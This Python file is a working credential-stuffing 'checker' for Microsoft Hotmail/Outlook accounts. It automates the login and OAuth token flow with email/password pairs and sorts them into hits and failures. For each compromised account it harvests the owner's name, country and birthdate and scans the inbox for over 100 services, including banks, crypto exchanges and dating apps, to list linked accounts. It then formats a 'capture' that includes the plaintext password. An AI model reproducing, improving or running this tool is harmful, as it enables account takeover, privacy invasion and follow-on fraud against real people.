import random
import re
import uuid
import requests
import pycountry


SERVICES = {
    # Social Media
    "Facebook": {"sender": "security@facebookmail.com"},
    "Instagram": {"sender": "security@mail.instagram.com"},
    "TikTok": {"sender": "register@account.tiktok.com"},
    "Twitter": {"sender": "info@x.com"},
    "LinkedIn": {"sender": "security-noreply@linkedin.com"},
    "Pinterest": {"sender": "no-reply@pinterest.com"},
    "Reddit": {"sender": "noreply@reddit.com"},
    "Snapchat": {"sender": "no-reply@accounts.snapchat.com"},
    "VK": {"sender": "noreply@vk.com"},
    "WeChat": {"sender": "no-reply@wechat.com"},

    # Messaging
    "WhatsApp": {"sender": "no-reply@whatsapp.com"},
    "Telegram": {"sender": "telegram.org"},
    "Discord": {"sender": "noreply@discord.com"},
    "Signal": {"sender": "no-reply@signal.org"},
    "Line": {"sender": "no-reply@line.me"},

    # Streaming & Entertainment
    "Netflix": {"sender": "info@account.netflix.com"},
    "Spotify": {"sender": "no-reply@spotify.com"},
    "Twitch": {"sender": "no-reply@twitch.tv"},
    "YouTube": {"sender": "no-reply@youtube.com"},
    "Vimeo": {"sender": "noreply@vimeo.com"},
    "Disney+": {"sender": "no-reply@disneyplus.com"},
    "Hulu": {"sender": "account@hulu.com"},
    "HBO Max": {"sender": "no-reply@hbomax.com"},
    "Amazon Prime": {"sender": "auto-confirm@amazon.com"},
    "Apple TV+": {"sender": "no-reply@apple.com"},
    "Crunchyroll": {"sender": "noreply@crunchyroll.com"},

    # E-commerce & Shopping
    "Amazon": {"sender": "auto-confirm@amazon.com"},
    "eBay": {"sender": "newuser@nuwelcome.ebay.com"},
    "Shopify": {"sender": "no-reply@shopify.com"},
    "Etsy": {"sender": "transaction@etsy.com"},
    "AliExpress": {"sender": "no-reply@aliexpress.com"},
    "Walmart": {"sender": "no-reply@walmart.com"},
    "Target": {"sender": "no-reply@target.com"},
    "Best Buy": {"sender": "no-reply@bestbuy.com"},
    "Newegg": {"sender": "no-reply@newegg.com"},
    "Wish": {"sender": "no-reply@wish.com"},

    # Payment & Finance
    "PayPal": {"sender": "service@paypal.com.br"},
    "Binance": {"sender": "do-not-reply@ses.binance.com"},
    "Coinbase": {"sender": "no-reply@coinbase.com"},
    "Kraken": {"sender": "no-reply@kraken.com"},
    "Bitfinex": {"sender": "no-reply@bitfinex.com"},
    "OKX": {"sender": "noreply@okx.com"},
    "Bybit": {"sender": "no-reply@bybit.com"},
    "Bitkub": {"sender": "no-reply@bitkub.com"},
    "Revolut": {"sender": "no-reply@revolut.com"},
    "TransferWise": {"sender": "no-reply@transferwise.com"},
    "Venmo": {"sender": "no-reply@venmo.com"},
    "Cash App": {"sender": "no-reply@cash.app"},

    # Gaming Platforms
    "Steam": {"sender": "noreply@steampowered.com"},
    "Xbox": {"sender": "xboxreps@engage.xbox.com"},
    "PlayStation": {"sender": "reply@txn-email.playstation.com"},
    "EpicGames": {"sender": "help@acct.epicgames.com"},
    "Rockstar": {"sender": "noreply@rockstargames.com"},
    "EA Sports": {"sender": "EA@e.ea.com"},
    "Ubisoft": {"sender": "noreply@ubisoft.com"},
    "Blizzard": {"sender": "noreply@blizzard.com"},
    "Riot Games": {"sender": "no-reply@riotgames.com"},
    "Valorant": {"sender": "noreply@valorant.com"},
    "Genshin Impact": {"sender": "noreply@hoyoverse.com"},
    "PUBG": {"sender": "noreply@pubgmobile.com"},
    "Free Fire": {"sender": "noreply@freefire.com"},
    "Mobile Legends": {"sender": "noreply@mobilelegends.com"},
    "Call of Duty": {"sender": "noreply@callofduty.com"},
    "Fortnite": {"sender": "noreply@epicgames.com"},
    "Roblox": {"sender": "accounts@roblox.com"},
    "Minecraft": {"sender": "noreply@mojang.com"},
    "Supercell": {"sender": "noreply@id.supercell.com"},
    "Konami": {"sender": "nintendo-noreply@ccg.nintendo.com"},
    "Nintendo": {"sender": "no-reply@accounts.nintendo.com"},
    "Origin": {"sender": "noreply@ea.com"},
    "Wild Rift": {"sender": "no-reply@wildrift.riotgames.com"},
    "Apex Legends": {"sender": "noreply@ea.com"},
    "League of Legends": {"sender": "no-reply@riotgames.com"},
    "Dota 2": {"sender": "noreply@valvesoftware.com"},
    "CS:GO": {"sender": "noreply@valvesoftware.com"},
    "GTA Online": {"sender": "noreply@rockstargames.com"},
    "Among Us": {"sender": "noreply@innersloth.com"},
    "Fall Guys": {"sender": "no-reply@mediatonic.co.uk"},

    # Tech & Productivity
    "Google": {"sender": "no-reply@accounts.google.com"},
    "Microsoft": {"sender": "account-security-noreply@accountprotection.microsoft.com"},
    "Apple": {"sender": "no-reply@apple.com"},
    "Yahoo": {"sender": "info@yahoo.com"},
    "GitHub": {"sender": "noreply@github.com"},
    "Dropbox": {"sender": "no-reply@dropbox.com"},
    "Zoom": {"sender": "no-reply@zoom.us"},
    "Slack": {"sender": "no-reply@slack.com"},
    "Trello": {"sender": "no-reply@trello.com"},

    # Food Delivery
    "Uber Eats": {"sender": "no-reply@uber.com"},
    "DoorDash": {"sender": "noreply@doordash.com"},
    "Grubhub": {"sender": "no-reply@grubhub.com"},
    "Swiggy": {"sender": "no-reply@swiggy.com"},
    "Deliveroo": {"sender": "no-reply@deliveroo.co.uk"},
    "Postmates": {"sender": "no-reply@postmates.com"},

    # Other Services
    "Depop": {"sender": "security@auth.depop.com"},
    "Reverb": {"sender": "info@reverb.com"},
    "Pinkbike": {"sender": "signup@pinkbike.com"},
    "OnlyFans": {"sender": "noreply@onlyfans.com"},
    "Patreon": {"sender": "no-reply@patreon.com"},
    "Tinder": {"sender": "no-reply@tinder.com"},
    "Bumble": {"sender": "no-reply@bumble.com"},
    "OkCupid": {"sender": "no-reply@okcupid.com"},
    "Grindr": {"sender": "no-reply@grindr.com"},
    "Meetup": {"sender": "no-reply@meetup.com"},
    "Eventbrite": {"sender": "no-reply@eventbrite.com"},
    "Kickstarter": {"sender": "no-reply@kickstarter.com"},
    "Indiegogo": {"sender": "no-reply@indiegogo.com"},
    "GoFundMe": {"sender": "no-reply@gofundme.com"},
}


def get_flag(country_name):
    try:
        country = pycountry.countries.lookup(country_name)
        return "".join(chr(127397 + ord(c)) for c in country.alpha_2)
    except Exception:
        return "🏳"


class HotmailChecker:
    def __init__(self):
        self.session = requests.Session()

    def _get_capture(self, email, password, token, cid):
        try:
            headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "ForceSync": "false",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Host": "substrate.office.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
            }
            response = requests.get(
                "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                headers=headers,
                timeout=30,
            ).json()
            name = response.get("names", [{}])[0].get("displayName", "Unknown")
            country = response.get("accounts", [{}])[0].get("location", "Unknown")
            flag = get_flag(country)
            try:
                birthdate = "{:04d}-{:02d}-{:02d}".format(
                    response["accounts"][0]["birthYear"],
                    response["accounts"][0]["birthMonth"],
                    response["accounts"][0]["birthDay"],
                )
            except Exception:
                birthdate = "Unknown"
        except Exception:
            name = "Unknown"
            country = "Unknown"
            flag = "🏳"
            birthdate = "Unknown"

        linked_services = []
        linked_service_names = []
        try:
            url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
            headers = {
                "Host": "outlook.live.com",
                "content-length": "0",
                "x-owa-sessionid": f"{cid}",
                "x-req-source": "Mini",
                "authorization": f"Bearer {token}",
                "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv)",
                "action": "StartupData",
                "x-owa-correlationid": f"{cid}",
                "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
                "content-type": "application/json; charset=utf-8",
                "accept": "*/*",
                "origin": "https://outlook.live.com",
                "x-requested-with": "com.microsoft.outlooklite",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://outlook.live.com/",
                "accept-encoding": "gzip, deflate",
                "accept-language": "en-US,en;q=0.9",
            }
            inbox_response = requests.post(url, headers=headers, data="", timeout=30).text

            for service_name, service_info in SERVICES.items():
                sender = service_info["sender"]
                if sender in inbox_response:
                    count = inbox_response.count(sender)
                    linked_services.append(f"[✔] {service_name} (Messages: {count})")
                    linked_service_names.append(service_name)
        except Exception:
            linked_services = []
            linked_service_names = []

        linked_services_str = (
            "\n".join(linked_services) if linked_services else "[×] No linked services found."
        )

        capture = (
            "~~~~~~~~~~~~~~ Sukuna ~~~~~~~~~~~~~~\n"
            f"Email : {email}\n"
            f"Password : {password}\n\n"
            f"Name : {name}\n"
            f"Country : {flag} {country}\n"
            f"Birthdate : {birthdate}\n\n"
            "Linked Services :\n"
            f"{linked_services_str}\n"
            "by : @BaignX\n"
            "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
        )
        return capture, linked_service_names

    def check_account(self, email, password):
        try:
            session = requests.Session()

            url1 = (
                "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress="
                f"{email}"
            )
            r1 = session.get(
                url1, headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9)"}, timeout=15
            )
            if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
                return {"status": "BAD"}

            url2 = (
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1"
                f"&login_hint={email}&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                "&scope=profile%20openid%20offline_access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2F"
                "fcg80qvoM1YMKJZibjBwQcDfOno%253D"
            )
            r2 = session.get(
                url2,
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
                timeout=15,
            )

            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match:
                return {"status": "BAD"}

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)

            login_data = (
                f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2"
                f"&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0"
                "&IsFidoSupported=0&i19=9960"
            )

            r3 = session.post(
                post_url,
                data=login_data,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "Origin": "https://login.live.com",
                    "Referer": r2.url,
                },
                allow_redirects=False,
                timeout=15,
            )

            if any(
                x in r3.text
                for x in ["account or password is incorrect", "error", "Incorrect password", "Invalid credentials"]
            ):
                return {"status": "BAD"}

            if any(url in r3.text for url in ["identity/confirm", "Abuse", "signedout", "locked"]):
                return {"status": "BAD"}

            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD"}

            code_match = re.search(r"code=([^&]+)", location)
            if not code_match:
                return {"status": "BAD"}

            code = code_match.group(1)

            token_data = {
                "client_info": "1",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
            }

            r4 = session.post(
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                data=token_data,
                timeout=15,
            )

            if r4.status_code != 200 or "access_token" not in r4.text:
                return {"status": "BAD"}

            token_json = r4.json()
            access_token = token_json.get("access_token")
            if not access_token:
                return {"status": "BAD"}

            mspcid = None
            for cookie in session.cookies:
                if cookie.name == "MSPCID":
                    mspcid = cookie.value
                    break
            cid = mspcid.upper() if mspcid else str(uuid.uuid4()).upper()

            capture, services = self._get_capture(email, password, access_token, cid)
            return {"status": "HIT", "capture": capture, "services": services}

        except requests.exceptions.Timeout:
            return {"status": "RETRY"}
        except Exception:
            return {"status": "RETRY"}
